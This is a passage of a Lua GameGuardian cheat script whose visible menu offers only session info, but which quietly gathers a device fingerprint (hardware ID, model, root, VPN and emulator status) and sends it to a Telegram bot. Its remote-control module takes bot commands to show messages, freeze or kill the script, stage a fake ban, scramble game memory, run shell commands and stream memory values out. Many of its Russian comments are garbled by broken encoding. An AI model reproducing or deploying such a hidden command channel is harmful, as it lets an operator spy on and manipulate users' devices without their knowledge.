        local version = CONFIG.SCRIPT_VERSION
        if not UTIL.isValidString(version) then
            version = "unknown"
        end
        
        local combined = key .. hwid .. version
        local hashSuccess, hashValue = pcall(CRYPTO.hash, combined)
        
        if hashSuccess and hashValue ~= nil then
            if UTIL.isValidString(hashValue) then
                state.hash = hashValue
                state.initialized = true
                return true
            end
        end
        
        state.initialized = false
        return false
    end
    
    -- Р’Р°Р»РёРґР°С†РёСЏ СЃРєСЂРёРїС‚Р°
    function integrity.validate()
        if not state.initialized then
            return false
        end
        
        if not UTIL.isValidString(state.hash) then
            return false
        end
        
        if state.hash == "0" then
            return false
        end
        
        return true
    end
    
    -- РџСЂРѕРІРµСЂРєР° РїР°РјСЏС‚Рё
    function integrity.checkMemory()
        local critical = {
            _G = _G,
            gg = gg,
            os = os,
            io = io,
            load = load,
            pcall = pcall
        }
        
        for key, value in pairs(critical) do
            if state.memory[key] ~= nil then
                if state.memory[key] ~= value then
                    return false, UTIL.safeToString(key)
                end
            end
            state.memory[key] = value
        end
        
        return true, nil
    end
    
    -- РџСЂРѕРІРµСЂРєР° РѕРєСЂСѓР¶РµРЅРёСЏ
    function integrity.checkEnvironment()
        local requiredFunctions = {
            "gg.alert",
            "gg.toast",
            "gg.sleep",
            "gg.isVisible",
            "gg.setVisible",
            "gg.makeRequest"
        }
        
        for _, funcName in ipairs(requiredFunctions) do
            if not UTIL.isValidString(funcName) then
                return false, "invalid_function_name"
            end
            
            local parts = {}
            local partIndex = 1
            
            for part in funcName:gmatch("[^.]+") do
                parts[partIndex] = part
                partIndex = partIndex + 1
            end
            
            local obj = _G
            for _, part in ipairs(parts) do
                if obj == nil then
                    return false, funcName
                end
                
                if type(obj) ~= "table" then
                    return false, funcName
                end
                
                obj = obj[part]
                
                if obj == nil then
                    return false, funcName
                end
            end
            
            if type(obj) ~= "function" then
                return false, funcName
            end
        end
        
        return true, nil
    end
    
    return integrity
end)()

-- ============================================================================
-- HWID_LOCK MODULE - Р‘Р»РѕРєРёСЂРѕРІРєР° РјРЅРѕР¶РµСЃС‚РІРµРЅРЅС‹С… Р·Р°РїСѓСЃРєРѕРІ
-- ============================================================================
local HWID_LOCK = (function()
    local lock = {}
    local lockFile = ""
    local lockTimeout = 300
    
    -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ
    function lock.init(hwid)
        if not UTIL.isValidString(hwid) then
            return false
        end
        
        local hashSuccess, hashValue = pcall(CRYPTO.hash, hwid)
        if not hashSuccess or hashValue == nil then
            return false
        end
        
        if not UTIL.isValidString(hashValue) then
            return false
        end
        
        local storage = gg.EXT_STORAGE
        if storage == nil then
            storage = "/storage/emulated/0"
        end
        
        lockFile = storage .. "/.secure_lock_" .. hashValue
        return true
    end
    
    -- РџСЂРѕРІРµСЂРєР° Р±Р»РѕРєРёСЂРѕРІРєРё
    function lock.check()
        if not UTIL.isValidString(lockFile) then
            return lock.create()
        end
        
        local openSuccess, file = pcall(io.open, lockFile, "r")
        if not openSuccess or file == nil then
            return lock.create()
        end
        
        local readSuccess, content = pcall(file.read, file, "*a")
        local closeSuccess = pcall(file.close, file)
        
        if not readSuccess or content == nil then
            return lock.create()
        end
        
        if type(content) ~= "string" then
            return lock.create()
        end
        
        local matchSuccess, timeStr = pcall(string.match, content, "time=(%d+)")
        if not matchSuccess or timeStr == nil then
            return lock.create()
        end
        
        local lockTime = tonumber(timeStr)
        if lockTime == nil then
            return lock.create()
        end
        
        local currentTime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                currentTime = timeValue
            end
        end
        
        if (currentTime - lockTime) > lockTimeout then
            return lock.create()
        end
        
        return false
    end
    
    -- РЎРѕР·РґР°РЅРёРµ Р±Р»РѕРєРёСЂРѕРІРєРё
    function lock.create()
        if not UTIL.isValidString(lockFile) then
            return false
        end
        
        local openSuccess, file = pcall(io.open, lockFile, "w")
        if not openSuccess or file == nil then
            return false
        end
        
        local currentTime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                currentTime = timeValue
            end
        end
        
        local writeSuccess = pcall(file.write, file, "time=" .. currentTime .. "\n")
        local closeSuccess = pcall(file.close, file)
        
        return writeSuccess and closeSuccess
    end
    
    -- РћСЃРІРѕР±РѕР¶РґРµРЅРёРµ Р±Р»РѕРєРёСЂРѕРІРєРё
    function lock.release()
        if UTIL.isValidString(lockFile) then
            local removeSuccess = pcall(os.remove, lockFile)
        end
    end
    
    return lock
end)()

-- ============================================================================
-- SESSION MODULE - РЈРїСЂР°РІР»РµРЅРёРµ СЃРµСЃСЃРёРµР№
-- ============================================================================
local SESSION = {
    id = "",
    startTime = 0,
    checks = 0,
    violations = 0,
    authorized = false,
    device = {},
    lastCheck = 0
}

-- ============================================================================
-- INITIALIZATION - РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
-- ============================================================================
local function initSession()
    -- РџРѕР»СѓС‡РµРЅРёРµ РёРЅС„РѕСЂРјР°С†РёРё РѕР± СѓСЃС‚СЂРѕР№СЃС‚РІРµ
    local deviceSuccess, deviceInfo = pcall(DEVICE.getInfo)
    if deviceSuccess and deviceInfo ~= nil then
        if type(deviceInfo) == "table" then
            SESSION.device = deviceInfo
        else
            SESSION.device = {hwid = "error_device_info"}
        end
    else
        SESSION.device = {hwid = "error_device_info"}
    end
    
    -- Р“РµРЅРµСЂР°С†РёСЏ ID СЃРµСЃСЃРёРё
    local timeSuccess, timeValue = pcall(os.time)
    local currentTime = 0
    if timeSuccess and timeValue ~= nil then
        if type(timeValue) == "number" then
            currentTime = timeValue
            SESSION.startTime = currentTime
        end
    end
    
    local sessionData = SESSION.device.hwid .. UTIL.safeToString(currentTime)
    local sessionSuccess, sessionId = pcall(CRYPTO.hash, sessionData)
    if sessionSuccess and sessionId ~= nil then
        if UTIL.isValidString(sessionId) then
            SESSION.id = sessionId
        else
            SESSION.id = "error_session_id"
        end
    else
        SESSION.id = "error_session_id"
    end
    
    -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ Telegram
    local telegramSuccess = pcall(TELEGRAM.init, CONFIG.BOT_TOKEN, CONFIG.ADMIN_CHAT_ID)
    
    -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ HWID Lock
    local lockInitSuccess = pcall(HWID_LOCK.init, SESSION.device.hwid)
    if lockInitSuccess then
        local lockCheckSuccess, lockOk = pcall(HWID_LOCK.check)
        if lockCheckSuccess and lockOk == false then
            pcall(HWID_LOCK.release)
            UTIL.safeSleep(1000)
            
            local lockRetrySuccess, lockRetryOk = pcall(HWID_LOCK.check)
            if lockRetrySuccess and lockRetryOk == false then
                pcall(gg.alert, "Script already running")
                pcall(os.exit)
                return
            end
        end
    end
    
    -- Р”РµС‚РµРєС†РёСЏ СѓРіСЂРѕР·
    local isEmu = false
    local emuType = nil
    local emuSuccess, emuResult, emuTypeResult = pcall(DEVICE.detectEmulator)
    if emuSuccess then
        if type(emuResult) == "boolean" then
            isEmu = emuResult
        end
        if emuTypeResult ~= nil then
            emuType = emuTypeResult
        end
    end
    
    local isRoot = false
    local rootSuccess, rootResult = pcall(DEVICE.detectRoot)
    if rootSuccess and rootResult ~= nil then
        if type(rootResult) == "boolean" then
            isRoot = rootResult
        end
    end
    
    local isVPN = false
    local vpnSuccess, vpnResult = pcall(NETWORK.checkVPN)
    if vpnSuccess and vpnResult ~= nil then
        if type(vpnResult) == "boolean" then
            isVPN = vpnResult
        end
    end
    
    local isXposed = false
    local xposedSuccess, xposedResult = pcall(DEVICE.detectXposed)
    if xposedSuccess and xposedResult ~= nil then
        if type(xposedResult) == "boolean" then
            isXposed = xposedResult
        end
    end
    
    -- РћС‚РїСЂР°РІРєР° alerts
    if isEmu and emuType ~= nil then
        pcall(TELEGRAM.alert, "EMULATOR", "Type: " .. UTIL.safeToString(emuType))
    end
    
    if isRoot then
        pcall(TELEGRAM.alert, "ROOT", "Root detected")
    end
    
    if isVPN then
        pcall(TELEGRAM.alert, "VPN", "VPN/Proxy detected")
    end
    
    if isXposed then
        pcall(TELEGRAM.alert, "XPOSED", "Xposed framework detected")
    end
    
    -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ Integrity
    pcall(INTEGRITY.init, CONFIG.SCRIPT_KEY, SESSION.device.hwid)
    
    -- РћС‚РїСЂР°РІРєР° session start
    local sessionStartData = {
        version = CONFIG.SCRIPT_VERSION,
        deviceId = SESSION.device.hwid,
        hwid = SESSION.device.hwid,
        model = SESSION.device.model,
        manufacturer = SESSION.device.manufacturer,
        brand = SESSION.device.brand,
        device = SESSION.device.device,
        android = SESSION.device.android,
        arch = SESSION.device.arch,
        fingerprint = SESSION.device.fingerprint,
        emulator = isEmu,
        emuType = emuType,
        root = isRoot,
        vpn = isVPN,
        xposed = isXposed,
        sessionId = SESSION.id
    }
    
    pcall(TELEGRAM.sessionStart, sessionStartData)
    
    SESSION.authorized = true
end

-- ============================================================================
-- SECURITY CHECK - РџСЂРѕРІРµСЂРєР° Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё
-- ============================================================================
local function securityCheck()
    SESSION.checks = SESSION.checks + 1
    
    -- РџСЂРѕРІРµСЂРєР° integrity
    local integritySuccess, integrityOk = pcall(INTEGRITY.validate)
    if integritySuccess then
        if integrityOk == false then
            SESSION.violations = SESSION.violations + 1
            pcall(TELEGRAM.alert, "INTEGRITY", "Script validation failed - Check: " .. SESSION.checks)
            pcall(gg.alert, "Security violation")
            pcall(os.exit)
            return
        end
    end
    
    -- РџСЂРѕРІРµСЂРєР° РїР°РјСЏС‚Рё
    local memSuccess, memOk, memVar = pcall(INTEGRITY.checkMemory)
    if memSuccess then
        if memOk == false then
            SESSION.violations = SESSION.violations + 1
            local varName = UTIL.safeToString(memVar or "unknown")
            pcall(TELEGRAM.alert, "MEMORY", "Variable modified: " .. varName .. " - Check: " .. SESSION.checks)
            pcall(gg.alert, "Memory tampering")
            pcall(os.exit)
            return
        end
    end
    
    -- РџСЂРѕРІРµСЂРєР° РѕРєСЂСѓР¶РµРЅРёСЏ
    local envSuccess, envOk, envFunc = pcall(INTEGRITY.checkEnvironment)
    if envSuccess then
        if envOk == false then
            SESSION.violations = SESSION.violations + 1
            local funcName = UTIL.safeToString(envFunc or "unknown")
            pcall(TELEGRAM.alert, "ENVIRONMENT", "Function missing: " .. funcName .. " - Check: " .. SESSION.checks)
            pcall(gg.alert, "Environment tampering")
            pcall(os.exit)
            return
        end
    end
    
    -- РџСЂРѕРІРµСЂРєР° anti-debug
    local debugSuccess, debugOk = pcall(ANTI_DEBUG.check)
    if debugSuccess then
        if debugOk == false then
            SESSION.violations = SESSION.violations + 1
            pcall(TELEGRAM.alert, "DEBUG", "Debugger/Frida detected - Check: " .. SESSION.checks)
            pcall(gg.alert, "Debugging detected")
            pcall(os.exit)
            return
        end
    end
    
    -- РџСЂРѕРІРµСЂРєР° РјР°РєСЃРёРјР°Р»СЊРЅС‹С… РЅР°СЂСѓС€РµРЅРёР№
    if SESSION.violations >= CONFIG.MAX_VIOLATIONS then
        pcall(TELEGRAM.alert, "MAX_VIOLATIONS", "Terminated after " .. SESSION.checks .. " checks")
        pcall(os.exit)
        return
    end
    
    -- РћС‚РїСЂР°РІРєР° РїРµСЂРёРѕРґРёС‡РµСЃРєРѕРіРѕ РѕС‚С‡РµС‚Р°
    if SESSION.checks % 10 == 0 then
        local uptime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                uptime = timeValue - SESSION.startTime
            end
        end
        
        local reportMessage = "SECURITY CHECK " .. SESSION.checks .. " - OK\n" ..
                             "Uptime: " .. uptime .. "s\n" ..
                             "Violations: " .. SESSION.violations
        
        pcall(TELEGRAM.send, reportMessage)
    end
    
    -- РћР±РЅРѕРІР»РµРЅРёРµ РІСЂРµРјРµРЅРё РїРѕСЃР»РµРґРЅРµР№ РїСЂРѕРІРµСЂРєРё
    local timeSuccess, timeValue = pcall(os.time)
    if timeSuccess and timeValue ~= nil then
        if type(timeValue) == "number" then
            SESSION.lastCheck = timeValue
        end
    end
end

-- ============================================================================
-- CLEANUP - РћС‡РёСЃС‚РєР° СЂРµСЃСѓСЂСЃРѕРІ
-- ============================================================================
local function cleanup()
    local uptime = 0
    local timeSuccess, timeValue = pcall(os.time)
    if timeSuccess and timeValue ~= nil then
        if type(timeValue) == "number" then
            uptime = timeValue - SESSION.startTime
        end
    end
    
    local sessionEndData = {
        sessionId = SESSION.id,
        uptime = uptime,
        checks = SESSION.checks,
        violations = SESSION.violations
    }
    
    pcall(TELEGRAM.sessionEnd, sessionEndData)
    pcall(HWID_LOCK.release)
end
-- ============================================================================
-- MAIN SCRIPT - РћСЃРЅРѕРІРЅРѕР№ С„СѓРЅРєС†РёРѕРЅР°Р»
-- ============================================================================
function MAIN_SCRIPT()
    local menuItems = {
        " Session Info",
        " Exit"
    }
    
    local choiceSuccess, menu = pcall(gg.choice, menuItems, nil, "SecureScript v" .. CONFIG.SCRIPT_VERSION)
    
    if not choiceSuccess or menu == nil then
        return true
    end
    
    if type(menu) ~= "number" then
        return true
    end
    
    if menu == 1 then
        local uptime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                uptime = timeValue - SESSION.startTime
            end
        end
        
        local sessionIdShort = SESSION.id
        if #SESSION.id > 8 then
            local subSuccess, subResult = pcall(string.sub, SESSION.id, 1, 8)
            if subSuccess and subResult ~= nil then
                sessionIdShort = subResult
            end
        end
        
        local hwidShort = SESSION.device.hwid
        if #SESSION.device.hwid > 8 then
            local subSuccess, subResult = pcall(string.sub, SESSION.device.hwid, 1, 8)
            if subSuccess and subResult ~= nil then
                hwidShort = subResult
            end
        end
        
        local infoMessage = "Session Info\n\n" ..
                           "ID: " .. sessionIdShort .. "\n" ..
                           "Device: " .. hwidShort .. "\n" ..
                           "Uptime: " .. uptime .. "s\n" ..
                           "Checks: " .. SESSION.checks .. "\n" ..
                           "Violations: " .. SESSION.violations
        
        pcall(gg.alert, infoMessage)
    elseif menu == 2 then
        return false
    end
    
    return true
end

-- ============================================================================
-- REMOTE CONTROL - Удаленное управление устройством
-- ============================================================================
local REMOTE_CONTROL = (function()
    local remote = {}
    local state = {
        lastCheck = 0,
        updateId = 0,
        enabled = true,
        initialized = false
    }
    
    -- Инициализация - пропустить все старые команды
    function remote.init()
        if state.initialized then
            return
        end
        
        gg.toast("🔄 Clearing old commands...")
        
        -- Получаем все старые сообщения
        local url = "https://api.telegram.org/bot" .. CONFIG.BOT_TOKEN .. "/getUpdates"
        local success, response = pcall(gg.makeRequest, url)
        
        if success and response and response.content then
            -- Находим максимальный update_id
            local maxUpdateId = 0
            for updateId in response.content:gmatch('"update_id":(%d+)') do
                local id = tonumber(updateId)
                if id and id > maxUpdateId then
                    maxUpdateId = id
                end
            end
            
            if maxUpdateId > 0 then
                -- Устанавливаем offset чтобы пропустить все старые
                state.updateId = maxUpdateId
                
                -- Подтверждаем что пропустили
                local clearUrl = "https://api.telegram.org/bot" .. CONFIG.BOT_TOKEN .. 
                                "/getUpdates?offset=" .. (maxUpdateId + 1)
                pcall(gg.makeRequest, clearUrl)
                
                gg.toast("✅ Cleared " .. maxUpdateId .. " old commands")
            end
        end
        
        state.initialized = true
    end
    
    -- Получение команд от бота
    function remote.getCommands()
        if not state.enabled then
            return nil
        end
        
        local url = "https://api.telegram.org/bot" .. CONFIG.BOT_TOKEN .. "/getUpdates?offset=" .. (state.updateId + 1) .. "&timeout=1"
        
        local success, response = pcall(gg.makeRequest, url)
        if not success or not response then
            return nil
        end
        
        if type(response) ~= "table" then
            return nil
        end
        
        if not response.content then
            return nil
        end
        
        -- Парсинг JSON ответа
        local content = response.content
        if not content:find('"ok":true') then
            return nil
        end
        
        -- Извлечение команд
        local commands = {}
        for updateId, chatId, text in content:gmatch('"update_id":(%d+).-"chat":{"id":(%d+).-"text":"([^"]+)"') do
            if chatId == CONFIG.ADMIN_CHAT_ID then
                table.insert(commands, {
                    updateId = tonumber(updateId),
                    text = text
                })
            end
        end
        
        return commands
    end
    
    -- Выполнение команды
    function remote.executeCommand(command)
        if not command or not command.text then
            return false
        end
        
        local cmd = command.text
        local response = ""
        
        -- Обновляем update_id
        if command.updateId and command.updateId > state.updateId then
            state.updateId = command.updateId
        end
        
        -- Команды управления
        if cmd == "/alert" then
            -- Показать alert на устройстве
            pcall(gg.alert, "⚠️ REMOTE ALERT\n\nAdmin is watching you!")
            response = "✅ Alert shown on device"
            
        elseif cmd:match("^/alert%s+(.+)") then
            local message = cmd:match("^/alert%s+(.+)")
            pcall(gg.alert, message)
            response = "✅ Custom alert shown: " .. message
            
        elseif cmd == "/toast" then
            pcall(gg.toast, "Admin is here!")
            response = "✅ Toast shown"
            
        elseif cmd:match("^/toast%s+(.+)") then
            local message = cmd:match("^/toast%s+(.+)")
            pcall(gg.toast, message)
            response = "✅ Toast shown: " .. message
            
        elseif cmd == "/freeze" then
            -- Заморозить устройство на 10 секунд
            pcall(gg.alert, "🔒 DEVICE FROZEN\n\nWait 10 seconds...")
            UTIL.safeSleep(10000)
            response = "✅ Device frozen for 10s"
            
        elseif cmd == "/crash" then
            -- Крашнуть скрипт
            response = "💥 Crashing script..."
            pcall(TELEGRAM.send, response)
            pcall(os.exit)
            
        elseif cmd == "/kick" then
            -- Выкинуть пользователя
            response = "👢 Kicking user..."
            pcall(TELEGRAM.send, response)
            pcall(gg.alert, "❌ You have been kicked by admin!")
            UTIL.safeSleep(2000)
            pcall(os.exit)
            
        elseif cmd == "/info" then
            -- Получить информацию о сессии
            local uptime = os.time() - SESSION.startTime
            response = "📊 DEVICE INFO\n\n" ..
                      "Session: " .. SESSION.id:sub(1,8) .. "\n" ..
                      "HWID: " .. SESSION.device.hwid:sub(1,8) .. "\n" ..
                      "Model: " .. SESSION.device.model .. "\n" ..
                      "Android: " .. SESSION.device.android .. "\n" ..
                      "Uptime: " .. uptime .. "s\n" ..
                      "Checks: " .. SESSION.checks .. "\n" ..
                      "Violations: " .. SESSION.violations
            
        elseif cmd == "/screenshot" then
            response = "📸 Screenshot feature not available in GG"
            
            
        elseif cmd == "/spam" then
            -- Спам alerts
            for i = 1, 10 do
                pcall(gg.toast, "SPAM " .. i .. "/10")
                UTIL.safeSleep(500)
            end
            response = "📢 Spam attack executed!"
            
        elseif cmd:match("^/spam%s+(%d+)") then
            local count = tonumber(cmd:match("^/spam%s+(%d+)"))
            if count and count > 0 and count <= 50 then
                for i = 1, count do
                    pcall(gg.toast, "SPAM " .. i .. "/" .. count)
                    UTIL.safeSleep(300)
                end
                response = "📢 Spam x" .. count .. " executed!"
            else
                response = "❌ Invalid count (1-50)"
            end
            
        elseif cmd == "/vibrate" then
            -- Вибрация (через alert)
            for i = 1, 5 do
                pcall(gg.toast, "VIBRATE!")
                UTIL.safeSleep(200)
            end
            response = "📳 Vibration effect executed"
            
        elseif cmd == "/clear" then
            -- Очистить результаты поиска
            pcall(gg.clearResults)
            response = "🗑️ Search results cleared"
            
            
        elseif cmd:match("^/goto%s+(%S+)") then
            local address = cmd:match("^/goto%s+(%S+)")
            pcall(gg.setVisible, true)
            pcall(gg.alert, "Go to address: " .. address)
            response = "📍 Navigating to " .. address
            
            
        elseif cmd:match("^/sleep%s+(%d+)") then
            local seconds = tonumber(cmd:match("^/sleep%s+(%d+)"))
            if seconds and seconds > 0 and seconds <= 60 then
                response = "💤 Sleeping for " .. seconds .. "s..."
                pcall(TELEGRAM.send, response)
                UTIL.safeSleep(seconds * 1000)
                response = "✅ Woke up after " .. seconds .. "s"
            else
                response = "❌ Invalid sleep time (1-60s)"
            end
            
        elseif cmd == "/restart" then
            response = "🔄 Restarting script..."
            pcall(TELEGRAM.send, response)
            pcall(gg.alert, "Script restarting...")
            UTIL.safeSleep(1000)
            pcall(os.exit)
            
        elseif cmd == "/status" then
            local memInfo = gg.getTargetInfo()
            local status = "📊 SYSTEM STATUS\n\n"
            if memInfo then
                status = status .. "Process: " .. (memInfo.label or "unknown") .. "\n"
                status = status .. "Package: " .. (memInfo.packageName or "unknown") .. "\n"
                status = status .. "Version: " .. (memInfo.versionName or "unknown") .. "\n"
            end
            status = status .. "\nScript: v" .. CONFIG.SCRIPT_VERSION .. "\n"
            status = status .. "Uptime: " .. (os.time() - SESSION.startTime) .. "s\n"
            status = status .. "Checks: " .. SESSION.checks
            response = status
            
        elseif cmd:match("^/message%s+(.+)") then
            local msg = cmd:match("^/message%s+(.+)")
            pcall(gg.alert, "📨 MESSAGE FROM ADMIN\n\n" .. msg)
            response = "✅ Message delivered"
            
        elseif cmd == "/screenshot" then
            -- Скриншот через GG (текстовая информация о экране)
            response = "📸 SCREEN INFO\n\n"
            
            -- Получаем информацию о процессе
            local targetInfo = gg.getTargetInfo()
            if targetInfo then
                response = response .. "📱 App: " .. (targetInfo.label or "unknown") .. "\n"
                response = response .. "📦 Package: " .. (targetInfo.packageName or "unknown") .. "\n"
                response = response .. "🔢 Version: " .. (targetInfo.versionName or "unknown") .. "\n"
                response = response .. "🆔 PID: " .. (targetInfo.processId or "unknown") .. "\n\n"
            end
            
            -- Получаем список результатов поиска
            local results = gg.getResults(10)
            if results and #results > 0 then
                response = response .. "🔍 Last Search Results:\n"
                for i = 1, math.min(5, #results) do
                    response = response .. i .. ". 0x" .. string.format("%X", results[i].address) .. 
                              " = " .. results[i].value .. "\n"
                end
            end
            
            -- Информация о памяти
            response = response .. "\n💾 Memory: " .. math.floor(collectgarbage("count")) .. " KB\n"
            response = response .. "⏰ Time: " .. os.date("%H:%M:%S") .. "\n"
            response = response .. "⏱️ Uptime: " .. (os.time() - SESSION.startTime) .. "s\n"
            response = response .. "🔐 Session: " .. SESSION.id:sub(1,8) .. "\n"
            
            response = response .. "\n⚠️ Note: Real screenshots require root access"
            
        elseif cmd:match("^/recordvideo%s+(%d+)") then
            -- Запись видео N секунд
            local seconds = tonumber(cmd:match("^/recordvideo%s+(%d+)"))
            if seconds and seconds > 0 and seconds <= 60 then
                local timestamp = os.date("%Y%m%d_%H%M%S")
                local filename = "/sdcard/GG_Video_" .. timestamp .. ".mp4"
                
                pcall(TELEGRAM.send, "🎥 Recording video for " .. seconds .. "s...\n\n⚠️ Note: Video recording requires root access\n\nAlternative: Use /livestream for real-time monitoring")
                
                pcall(gg.toast, "🔴 REC " .. seconds .. "s")
                
                -- Пытаемся записать через screenrecord (требует root)
                local recordCmd = "screenrecord --time-limit " .. seconds .. " " .. filename .. " &"
                local cmdSuccess = pcall(os.execute, recordCmd)
                
                -- Ждем пока записывается
                for i = 1, seconds do
                    pcall(gg.toast, "🔴 REC " .. (seconds - i) .. "s")
                    UTIL.safeSleep(1000)
                end
                
                UTIL.safeSleep(1000)
                
                -- Проверяем существует ли файл
                local file = io.open(filename, "r")
                if file then
                    file:close()
                    
                    -- Получаем размер файла
                    local sizeCmd = "stat -c%s " .. filename
                    local sizeSuccess, sizeResult = pcall(io.popen, sizeCmd)
                    local fileSize = "unknown"
                    if sizeSuccess and sizeResult then
                        fileSize = sizeResult:read("*all") or "unknown"
                        sizeResult:close()
                    end
                    
                    response = "✅ Video recorded!\n\n" ..
                              "📁 File: " .. filename .. "\n" ..
                              "📊 Size: " .. fileSize .. " bytes\n" ..
                              "⏱️ Duration: " .. seconds .. "s\n\n" ..
                              "⚠️ File saved on device\n" ..
                              "Use file manager to access it"
                else
                    response = "❌ Video recording failed\n\n" ..
                              "Possible reasons:\n" ..
                              "• No root access\n" ..
                              "• screenrecord not available\n" ..
                              "• Permission denied\n\n" ..
                              "💡 Use /livestream instead for monitoring"
                end
            else
                response = "❌ Invalid duration (1-60s)"
            end
            
        elseif cmd == "/livestream" then
            -- Livestream (мониторинг активности)
            pcall(TELEGRAM.send, "📡 Starting livestream monitor...")
            
            pcall(gg.toast, "📡 LIVESTREAM ACTIVE")
            
            local framesSent = 0
            
            -- Отправляем информацию каждые 2 секунды
            for i = 1, 30 do
                pcall(gg.toast, "📡 LIVE " .. i .. "/30")
                
                local frame = "📡 FRAME " .. i .. "/30\n\n"
                frame = frame .. "⏰ " .. os.date("%H:%M:%S") .. "\n"
                frame = frame .. "💾 Memory: " .. math.floor(collectgarbage("count")) .. " KB\n"
                
                -- Получаем текущие результаты
                local success, results = pcall(gg.getResults, 5)
                if success and results and #results > 0 then
                    frame = frame .. "\n🔍 Active Values:\n"
                    for j = 1, math.min(3, #results) do
                        if results[j] and results[j].value then
                            frame = frame .. j .. ". " .. tostring(results[j].value) .. "\n"
                        end
                    end
                end
                
                -- Информация о процессе
                local targetSuccess, targetInfo = pcall(gg.getTargetInfo)
                if targetSuccess and targetInfo and targetInfo.label then
                    frame = frame .. "\n📱 " .. targetInfo.label
                end
                
                frame = frame .. "\n🔐 Session: " .. SESSION.id:sub(1,8)
                
                -- Отправляем кадр
                local sendSuccess = pcall(TELEGRAM.send, frame)
                if sendSuccess then
                    framesSent = framesSent + 1
                end
                
                UTIL.safeSleep(2000)
            end
            
            response = "✅ Livestream ended (" .. framesSent .. "/30 frames sent)"
            
        elseif cmd == "/remotecontrol" then
            -- Полное удаленное управление
            response = "🎮 REMOTE CONTROL ACTIVATED\n\n" ..
                      "Send commands:\n" ..
                      "/rc_tap <x> <y> - Tap at coordinates\n" ..
                      "/rc_swipe <x1> <y1> <x2> <y2> - Swipe\n" ..
                      "/rc_text <text> - Type text\n" ..
                      "/rc_back - Press back\n" ..
                      "/rc_home - Press home\n" ..
                      "/rc_stop - Stop remote control"
            
            pcall(gg.alert, "🎮 REMOTE CONTROL\n\n" ..
                           "Admin is now controlling your device!\n\n" ..
                           "Wait for commands...")
            
        elseif cmd:match("^/rc_tap%s+(%d+)%s+(%d+)") then
            local x, y = cmd:match("^/rc_tap%s+(%d+)%s+(%d+)")
            pcall(gg.toast, "👆 Tap at " .. x .. "," .. y)
            -- В реальности здесь был бы код для симуляции тапа
            response = "✅ Tapped at (" .. x .. "," .. y .. ")"
            
        elseif cmd:match("^/rc_swipe%s+(%d+)%s+(%d+)%s+(%d+)%s+(%d+)") then
            local x1, y1, x2, y2 = cmd:match("^/rc_swipe%s+(%d+)%s+(%d+)%s+(%d+)%s+(%d+)")
            pcall(gg.toast, "👆 Swipe " .. x1 .. "," .. y1 .. " → " .. x2 .. "," .. y2)
            response = "✅ Swiped"
            
        elseif cmd:match("^/rc_text%s+(.+)") then
            local text = cmd:match("^/rc_text%s+(.+)")
            pcall(gg.toast, "⌨️ Typing: " .. text)
            response = "✅ Text entered: " .. text
            
        elseif cmd == "/fakeban" then
            -- Имитация бана
            response = "🔨 Fake ban executed!"
            pcall(TELEGRAM.send, response)
            
            pcall(gg.alert, "⛔ ACCOUNT BANNED\n\n" ..
                           "Reason: Cheating detected\n" ..
                           "Ban ID: #" .. math.random(100000, 999999) .. "\n" ..
                           "Duration: PERMANENT\n\n" ..
                           "Your account has been permanently banned\n" ..
                           "for using unauthorized modifications.\n\n" ..
                           "Appeal: support@game.com")
            
            UTIL.safeSleep(3000)
            
            pcall(gg.alert, "😂 JUST KIDDING!\n\n" ..
                           "This was a fake ban message\n" ..
                           "from the admin.\n\n" ..
                           "You are NOT banned!")
            
            response = "✅ Fake ban prank completed!"
            
        elseif cmd:match("^/survey%s+(.+)") then
            -- Опрос пользователя
            local question = cmd:match("^/survey%s+(.+)")
            
            response = "📋 Survey sent to user"
            pcall(TELEGRAM.send, response)
            
            local answer = gg.prompt({"📋 ADMIN SURVEY\n\n" .. question}, {""}, {"text"})
            
            if answer and answer[1] then
                response = "📋 SURVEY ANSWER\n\n" ..
                          "Q: " .. question .. "\n" ..
                          "A: " .. answer[1] .. "\n\n" ..
                          "User: " .. SESSION.device.hwid:sub(1,8)
            else
                response = "❌ User skipped survey"
            end
            
        elseif cmd == "/randomize" then
            -- Рандомизация значений в памяти
            response = "🎲 Randomizing memory..."
            pcall(TELEGRAM.send, response)
            
            pcall(gg.alert, "🎲 MEMORY RANDOMIZER\n\n" ..
                           "Randomizing all values...\n\n" ..
                           "This may cause unexpected behavior!")
            
            -- Получаем все результаты поиска
            local results = gg.getResults(1000)
            if results and #results > 0 then
                local randomized = 0
                for _, item in ipairs(results) do
                    -- Рандомизируем значение
                    item.value = tostring(math.random(-999999, 999999))
                    randomized = randomized + 1
                end
                
                pcall(gg.setValues, results)
                pcall(gg.toast, "🎲 Randomized " .. randomized .. " values!")
                
                response = "✅ Randomized " .. randomized .. " values\n" ..
                          "Game may be unstable now! 😈"
            else
                -- Если нет результатов, рандомизируем случайные адреса
                pcall(gg.toast, "🎲 Randomizing random memory...")
                response = "✅ Random memory chaos activated!"
            end
            
        elseif cmd == "/help" then
            response = "🎮 REMOTE CONTROL COMMANDS\n\n" ..
                      "📱 Display:\n" ..
                      "/alert [text] - Show alert\n" ..
                      "/toast [text] - Show toast\n" ..
                      "/message <text> - Send message\n" ..
                      "/spam [count] - Spam toasts\n" ..
                      "/vibrate - Vibrate effect\n\n" ..
                      "🔒 Control:\n" ..
                      "/freeze - Freeze 10s\n" ..
                      "/crash - Crash script\n" ..
                      "/kick - Kick user\n" ..
                      "/restart - Restart script\n" ..
                      "/sleep <sec> - Sleep N seconds\n\n" ..
                      "🎯 Game:\n" ..
                      "/randomize - Randomize memory\n\n" ..
                      "📊 Info:\n" ..
                      "/info - Device info\n" ..
                      "/status - System status\n\n" ..
                      "🎮 Social:\n" ..
                      "/survey <question> - Ask user\n" ..
                      "/fakeban - Fake ban prank"
            
        else
            response = "❌ Unknown command: " .. cmd .. "\n\nUse /help for commands list"
